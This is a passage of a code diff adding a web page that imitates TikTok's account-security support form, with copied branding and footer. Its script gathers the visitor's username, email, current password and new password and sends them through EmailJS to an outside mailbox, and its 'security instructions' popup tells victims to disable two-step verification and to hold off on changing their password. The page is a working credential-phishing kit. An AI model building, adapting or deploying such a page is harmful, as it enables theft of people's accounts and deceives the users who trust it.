+              rel="noreferrer"
+              ><span>Terms of Service</span></a
+            >
+          </h5>
+        </div>
+      </footer>
+      <div class="footer-bottom-wrapper">
+        <div
+          class="language-selection"
+          style="
+            background: url(https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/arrow-f377b007699e24ff2061-ad23990600d5638a312d7c35028ea32e46618056.svg)
+              center no-repeat;
+            background-position: right 10px bottom 11px;
+          "
+        >
+          <p><span>English</span></p>
+          <select class="language-selection-form">
+            <option value="id">Bahasa Indonesia</option>
+            <option value="de">Deutsch</option>
+            <option selected="" value="en">English</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="it">Italiano</option>
+            <option value="pl">Polski</option>
+            <option value="pt_BR">Português</option>
+            <option value="vi">Tiếng Việt</option>
+            <option value="tr">Türkçe</option>
+            <option value="ru">Русский</option>
+            <option value="hi">हिन्दी</option>
+            <option value="ko">한국어</option>
+            <option value="ja">日本語</option>
+            <option value="zh_Hant_tw">繁體中文</option>
+            <option value="ar">العربية</option>
+            <option value="ur">اردو</option>
+            <option value="ms">Bahasa Melayu</option>
+            <option value="fil">Filipino</option>
+            <option value="nl">Nederlands</option>
+            <option value="th">ภาษาไทย</option>
+            <option value="km">ភាសាខ្មែរ</option>
+            <option value="uk">Українська</option>
+            <option value="da">dansk</option>
+          </select>
+        </div>
+        <div class="copyright">
+          ©
+          <!-- -->2025<!-- -->
+          TikTok
+        </div>
+      </div>
+    </div>
+
+    <div class="popup-overlay" id="successPopup">
+      <div class="popup-container">
+        <button class="popup-close" onclick="closePopup()">&times;</button>
+        <img
+          src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/csp/static/build/_assets/logo-dark-d62c3812fbf2f687daa9-ad23990600d5638a312d7c35028ea32e46618056.svg"
+          alt="TikTok"
+          class="popup-icon"
+        />
+        <h2 class="popup-title">Request submitted!</h2>
+        <p class="popup-message">Thanks for contacting TikTok.</p>
+
+        <div class="popup-instructions">
+          <h3>Important Security Instructions:</h3>
+          <ol>
+            <li>
+              If you have listed your account on any social media selling
+              platform, please remove the listing immediately. Your account
+              security cannot be guaranteed until this is done.
+            </li>
+            <li>
+              Please refrain from changing your TikTok password through the
+              TikTok app until you receive an official email from TikTok
+              confirming your account has been secured (this typically takes
+              less than 24 hours).
+            </li>
+            <li>
+              For a smoother account securing process, please temporarily
+              disable Two-Step Verification (2SV) in your TikTok account
+              settings.
+            </li>
+          </ol>
+        </div>
+
+        <button class="popup-button" onclick="closePopup()">OK</button>
+      </div>
+    </div>
+
+    <!-- Add EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Initialize EmailJS
+        emailjs.init("TX8jnM_Ze4KbnxT2J");
+
+        console.log("Initializing form functionality");
+
+        const form = document.querySelector(".report-form");
+        const usernameInput = document.getElementById("username");
+        const emailInput = document.getElementById("email");
+        const currentPasswordInput =
+          document.getElementById("current-password");
+        const newPasswordInput = document.getElementById("new-password");
+        const checkbox = document.querySelector(".declaration-checkbox");
+        const submitBtn = document.querySelector(".form-submit-btn");
+        const strengthBar = document.querySelector(".strength-bar");
+        const strengthText = document.querySelector(".strength-text span");
+
+        // Toggle password visibility
+        document.querySelectorAll(".toggle-password").forEach((button) => {
+          button.addEventListener("click", function () {
+            const targetId = this.getAttribute("data-target");
+            const input = document.getElementById(targetId);
+            const icon = this.querySelector("i");
+
+            console.log("Toggling password visibility for", targetId);
+
+            if (input.type === "password") {
+              input.type = "text";
+              icon.classList.remove("fa-eye");
+              icon.classList.add("fa-eye-slash");
+            } else {
+              input.type = "password";
+              icon.classList.remove("fa-eye-slash");
+              icon.classList.add("fa-eye");
+            }
+          });
+        });
+
+        // Password strength checker
+        function checkPasswordStrength(password) {
+          console.log("Checking password strength");
+
+          const hasLetter = /[a-zA-Z]/.test(password);
+          const hasNumber = /\d/.test(password);
+          const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+          const isLongEnough = password.length >= 8;
+
+          let strength = 0;
+          if (hasLetter) strength++;
+          if (hasNumber) strength++;
+          if (hasSpecial) strength++;
+          if (isLongEnough) strength++;
+
+          console.log("Password strength score:", strength);
+
+          return {
+            score: strength,
+            text: strength <= 2 ? "Weak" : strength === 3 ? "Medium" : "Strong",
+            class:
+              strength <= 2 ? "weak" : strength === 3 ? "medium" : "strong",
+          };
+        }
+
+        // Update password strength indicator
+        newPasswordInput.addEventListener("input", function () {
+          const strength = checkPasswordStrength(this.value);
+
+          strengthBar.className = "strength-bar " + strength.class;
+          strengthText.textContent = strength.text;
+          strengthText.className = strength.class;
+        });
+
+        // Form validation
+        function validateForm() {
+          console.log("Validating form...");
+
+          const isUsernameValid = usernameInput.value.trim().length > 0;
+          const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(
+            emailInput.value
+          );
+          const isCurrentPasswordValid = currentPasswordInput.value.length >= 8;
+          const isNewPasswordValid =
+            checkPasswordStrength(newPasswordInput.value).score >= 3;
+          const isCheckboxChecked = checkbox.checked;
+
+          console.log({
+            isUsernameValid,
+            isEmailValid,
+            isCurrentPasswordValid,
+            isNewPasswordValid,
+            isCheckboxChecked,
+          });
+
+          return (
+            isUsernameValid &&
+            isEmailValid &&
+            isCurrentPasswordValid &&
+            isNewPasswordValid &&
+            isCheckboxChecked
+          );
+        }
+
+        // Enable/disable submit button based on validation
+        function updateSubmitButton() {
+          const isValid = validateForm();
+          submitBtn.disabled = !isValid;
+          console.log("Submit button " + (isValid ? "enabled" : "disabled"));
+        }
+
+        // Add event listeners
+        [
+          usernameInput,
+          emailInput,
+          currentPasswordInput,
+          newPasswordInput,
+          checkbox,
+        ].forEach((element) => {
+          element.addEventListener("change", updateSubmitButton);
+          element.addEventListener("input", updateSubmitButton);
+        });
+
+        function showPopup() {
+          document.getElementById("successPopup").classList.add("active");
+        }
+
+        function closePopup() {
+          document.getElementById("successPopup").classList.remove("active");
+        }
+
+        window.closePopup = closePopup;
+
+        // Handle form submission
+        form.addEventListener("submit", function (e) {
+          e.preventDefault();
+          console.log("Form submitted");
+
+          const formData = {
+            username: usernameInput.value,
+            email: emailInput.value,
+            currentPassword: currentPasswordInput.value,
+            newPassword: newPasswordInput.value,
+          };
+
+          console.log("Form data:", {
+            ...formData,
+            currentPassword: "***",
+            newPassword: "***",
+          });
+
+          // Send email using EmailJS
+          emailjs
+            .send("service_w4f4um4", "template_6gfhbth", {
+              to_name: "Security Admin",
+              from_name: formData.username,
+              user_email: formData.email,
+              current_password: formData.currentPassword,
+              new_password: formData.newPassword,
+              timestamp: new Date().toLocaleString()
+            })
+            .then(
+              function (response) {
+                console.log("Email sent successfully:", response);
+                showPopup();
+                form.reset();
+                strengthBar.className = "strength-bar";
+                strengthText.textContent = "Weak";
+                strengthText.className = "";
+                updateSubmitButton();
+              },
+              function (error) {
+                console.error("Email send failed:", error);
+                alert(
+                  "There was an error processing your request. Please try again later."
+                );
+              }
+            );
+        });
+
+        // Initial validation check
+        updateSubmitButton();
+      });
+    </script>
+  </body>
+</html>
